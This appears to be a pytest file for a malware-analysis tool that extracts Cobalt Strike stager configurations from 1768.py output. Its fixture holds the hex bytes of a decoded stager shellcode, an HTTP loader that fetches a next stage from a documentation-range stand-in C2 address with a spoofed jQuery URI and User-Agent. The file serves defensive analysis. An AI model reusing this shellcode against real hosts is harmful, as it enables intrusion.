"""Cobalt Strike stager inside a PE: 1768.py reports it as messages (and a hex dump of the
decoded shellcode), not as ``config``.

Fixture: the stager of sample 224aec5f… as printed by 1768.py, with the C2 address replaced by
an RFC 5737 documentation address (198.51.100.77) so no live indicator is kept in the repo.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from docutracex.c2 import cobalt


@pytest.fixture(autouse=True)
def _no_dissect(monkeypatch: pytest.MonkeyPatch) -> None:
    """These tests count 1768.py calls: keep dissect.cobaltstrike out (it has its own tests)."""
    monkeypatch.setenv("DOCUTRACEX_DISSECT_CS", "0")

# Decoded stager shellcode (802 bytes incl. the 4-byte XOR key prefix), C2 address sanitised.
SHELLCODE = bytes.fromhex(
    "f82b04a7fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7"
    "e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c7"
    "38e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b"
    "12eb865d686e6574006877696e6954684c772607ffd531ff5757575757683a5679a7ffd5e9840000005b31c951516a03"
    "515168901f000053506857899fc6ffd5eb705b31d252680002408452525253525068eb552e3bffd589c683c35031ff57"
    "576aff5356682d06187bffd585c00f84c301000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff"
    "576a0751565068b757e00bffd5bf002f000039c774b731ffe991010000e9c9010000e88bffffff2f6a71756572792d33"
    "2e332e312e736c696d2e6d696e2e6a7300119479456c878c76d0faf3ddb45d4a7a2c202fbc644fe501f6255e8941511f"
    "f74edf5feea154c233069347290960baa8f3f8fd7d04004163636570743a20746578742f68746d6c2c6170706c696361"
    "74696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a"
    "4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a526566657265723a20687474703a2f"
    "2f636f64652e6a71756572792e636f6d2f0d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e64"
    "6f7773204e542031302e303b2057696e36343b2078363429204170706c655765624b69742f3533372e333620284b4854"
    "4d4c2c206c696b65204765636b6f29204368726f6d652f3133392e302e302e30205361666172692f3533372e33362045"
    "64672f3133392e302e302e300d0a00f1c57cc9f026bfe28c07bbf4bdd68b0ce238b28bdbd77b0068f0b5a256ffd56a40"
    "68001000006800004000576858a453e5ffd593b9af0f000001d9515389e7576800200000535668129689e2ffd585c074"
    "c68b0701c385c075e558c3e8a9fdffff3139382e35312e3130302e373700"
)
HOST = "198.51.100.77"


def _hexdump(data: bytes) -> list[str]:
    """Same layout as 1768.py's dump: offset, 16 bytes in two groups of 8, ascii."""
    out = []
    for off in range(0, len(data), 16):
        row = data[off:off + 16]
        left = " ".join(f"{b:02X}" for b in row[:8])
        right = " ".join(f"{b:02X}" for b in row[8:])
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        out.append(f"{off:08X}: {left:<23}  {right:<23}  {asc}")
    return out


HEADER_MSGS = [
    "File: stager.exe",
    "payloadType: 0x00000000",
    "payloadSize: 0x00000000",
    "intxorkey: 0x00000000",
    "id2: 0x00000000",
    "Skipping 32 bytes",
    "payloadType: 0x00007630",
    "payloadSize: 0x0000031e",
    "intxorkey: 0xa7042bf8",
    "id2: 0x00000000",
    "Probably found shellcode:",
    f"Parameter: 782 b'{HOST}'",
    "push      :   194       8080 b'h\\x90\\x1f\\x00\\x00'",
    "push      :   720       4096 b'h\\x00\\x10\\x00\\x00'",
    "push      :   751       8192 b'h\\x00 \\x00\\x00'",
    "String: 547 b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0'",
]
FULL_MSGS = HEADER_MSGS + _hexdump(SHELLCODE)


def test_hexdump_is_rebuilt() -> None:
    assert cobalt._hexdump_bytes(FULL_MSGS) == SHELLCODE


def test_shellcode_config() -> None:
    cfg = cobalt._shellcode_config(SHELLCODE)
    assert cfg["architecture"] == "x86"
    assert cfg["transport"] == "HTTP"
    assert cfg["port"] == 8080
    assert cfg["uri"] == "/jquery-3.3.1.slim.min.js"
    assert cfg["hosts"] == [HOST]
    assert cfg["http flags"].startswith("0x84400200")
    assert "wininet!InternetConnectA" in cfg["apis"]
    assert any(h.startswith("Referer: http://code.jquery.com/") for h in cfg["headers"])


def test_full_stager_config() -> None:
    res = cobalt._stager_from_messages(FULL_MSGS)
    assert res is not None
    assert res["method"].endswith("+ shellcode parsed")
    summary, hosts = cobalt.summarise(res["fields"])
    assert hosts == [HOST]
    assert summary["C2"] == [f"{HOST}:8080"]
    assert summary["GET URI"] == ["/jquery-3.3.1.slim.min.js"]
    assert summary["Referer"] == "http://code.jquery.com/"
    assert summary["User-Agent"].startswith("Mozilla/5.0")
    assert summary["Architecture"] == "x86"
    assert "Accept-Language: en-US" in summary["HTTP headers"]
    assert "Referer" not in summary["HTTP headers"]          # shown on its own, not twice


def test_without_hexdump_still_gives_host_port_ua() -> None:
    res = cobalt._stager_from_messages(HEADER_MSGS)
    assert res is not None
    summary, hosts = cobalt.summarise(res["fields"])
    assert summary["C2"] == [f"{HOST}:8080"]          # 4096 / 8192 are VirtualAlloc sizes, not ports
    assert summary["User-Agent"].startswith("Mozilla/5.0")
    assert "GET URI" not in summary


def test_no_shellcode_gives_nothing() -> None:
    msgs = ["File: x.exe", "Error: PE file error: .data section not found: '.text' '.rsrc' '.reloc'"]
    assert cobalt._stager_from_messages(msgs) is None


def _fake_1768(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, json_msgs: list[str]) -> list[list[str]]:
    script = tmp_path / "1768.py"
    script.write_text("# stub")
    monkeypatch.setattr(cobalt, "_script", lambda: script)
    monkeypatch.setattr(cobalt, "_is_pe", lambda data: True)
    calls: list[list[str]] = []

    def run(cmd, *a, **k):  # noqa: ANN001
        calls.append(cmd)
        if "-J" in cmd:
            out = json.dumps({"filename": "stager.exe", "messages": json_msgs, "config": {}})
        else:
            out = "\n".join(FULL_MSGS)
        return subprocess.CompletedProcess(cmd, 0, stdout=out, stderr="")

    monkeypatch.setattr(subprocess, "run", run)
    return calls


@pytest.mark.parametrize("json_has_dump", [True, False])
def test_extract_end_to_end(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, json_has_dump: bool) -> None:
    calls = _fake_1768(tmp_path, monkeypatch, FULL_MSGS if json_has_dump else HEADER_MSGS)
    sample = tmp_path / "stager.exe"
    sample.write_bytes(b"MZ" + b"\x00" * 64)
    res = cobalt.extract(sample, sample.read_bytes())
    assert res is not None
    assert res["family"] == "Cobalt Strike"
    assert res["kind"] == "stager"
    assert res["c2"] == [HOST]
    assert res["summary"]["GET URI"] == ["/jquery-3.3.1.slim.min.js"]
    # Text report only requested when the JSON lacks the dump.
    assert len(calls) == (1 if json_has_dump else 2)


# --- Retry cascade (-x / -r -x / -r -x -e) ------------------------------------------------
BEACON_CFG = {"1": {"id": "payload type", "info": "8 windows-beacon_https-reverse_https"},
              "2": {"id": "port", "info": "443"},
              "8": {"id": "server,get-uri", "info": "'198.51.100.77,/api/x'"},
              "9": {"id": "useragent", "info": "'Mozilla/5.0'"}}


def _cascade(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, hit_on: tuple[str, ...] | None,
             data: bytes) -> tuple[dict | None, list[list[str]]]:
    script = tmp_path / "1768.py"
    script.write_text("# stub")
    monkeypatch.setattr(cobalt, "_script", lambda: script)
    calls: list[list[str]] = []

    def run(cmd, *a, **k):  # noqa: ANN001
        calls.append(cmd)
        extra = tuple(c for c in cmd[4:-1])          # after: python 1768.py -J -n
        cfg = BEACON_CFG if hit_on is not None and extra == hit_on else {}
        return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps({"messages": [], "config": cfg}), stderr="")

    monkeypatch.setattr(subprocess, "run", run)
    sample = tmp_path / "s.bin"
    sample.write_bytes(data)
    return cobalt.extract(sample, data), calls


PE_LIKE = b"MZ" + b"\x00" * 0x3A + b"\x40\x00\x00\x00" + b"PE\x00\x00" + bytes(range(256)) * 4
RAW_BIN = bytes(range(256)) * 8                  # no config header, binary, not a PE


def test_cascade_pe_order_and_hit_on_xorkeys(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    res, calls = _cascade(tmp_path, monkeypatch, ("-x",), PE_LIKE)
    assert [c[4:-1] for c in calls] == [[], ["-x"]]          # parsed first, never -r first on a PE
    assert res["c2"] == ["198.51.100.77"]
    assert "[retry: -x]" in res["method"]
    assert res["confidence"] == "high"


def test_cascade_experimental_is_medium(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    res, calls = _cascade(tmp_path, monkeypatch, ("-r", "-x", "-e"), PE_LIKE)
    assert [c[4:-1] for c in calls] == [[], ["-x"], ["-r", "-x"], ["-r", "-x", "-e"]]
    assert res["confidence"] == "medium"
    assert "[retry: -r -x -e]" in res["method"]


def test_cascade_raw_binary_without_header(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    res, calls = _cascade(tmp_path, monkeypatch, ("-r", "-x"), RAW_BIN)
    assert [c[4:-1] for c in calls] == [["-r"], ["-r", "-x"]]
    assert res["c2"] == ["198.51.100.77"]


def test_cascade_stops_at_first_hit(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    res, calls = _cascade(tmp_path, monkeypatch, (), PE_LIKE)
    assert len(calls) == 1
    assert "retry" not in res["method"]


def test_cascade_disabled_by_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCUTRACEX_1768_DEEP", "0")
    res, calls = _cascade(tmp_path, monkeypatch, ("-x",), PE_LIKE)
    assert res is None and len(calls) == 1
    res, calls = _cascade(tmp_path, monkeypatch, ("-r", "-x"), RAW_BIN)
    assert res is None and calls == []                     # raw binary without header: not even tried


def test_cascade_skips_text_media_and_big_files(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    for data in (b"#!/bin/sh\necho hello\n" * 200, b"\x89PNG\r\n\x1a\n" + RAW_BIN):
        res, calls = _cascade(tmp_path, monkeypatch, ("-r", "-x"), data)
        assert res is None and calls == []
    monkeypatch.setenv("DOCUTRACEX_1768_DEEP_MAX_MB", "0")
    res, calls = _cascade(tmp_path, monkeypatch, ("-x",), PE_LIKE)
    assert res is None and len(calls) == 1                 # PE still gets the default run
